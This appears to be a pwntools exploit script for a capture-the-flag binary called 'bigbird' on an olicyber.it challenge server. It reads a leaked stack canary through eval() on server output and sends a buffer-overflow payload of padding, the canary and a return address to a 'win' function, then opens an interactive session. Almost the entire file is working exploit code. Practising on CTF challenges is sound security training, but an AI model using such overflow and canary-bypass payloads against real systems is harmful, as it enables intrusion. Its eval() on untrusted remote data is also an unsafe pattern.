#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    p = remote('bigbird.challs.olicyber.it', 12006)
else:
    p = gdb.debug('./bigbird', 'b *main')
    # p = process('./bigbird')

WIN = p64(0x401715)
p.recvuntil(b': ')
canary = p64(eval(p.recvuntil(b'\n')[:-1].decode()))
p.recvuntil(b'N4\n')

PAYLOAD = b'a'*40 + canary + b'a' * 8 + WIN
p.sendline(PAYLOAD)
p.interactive()
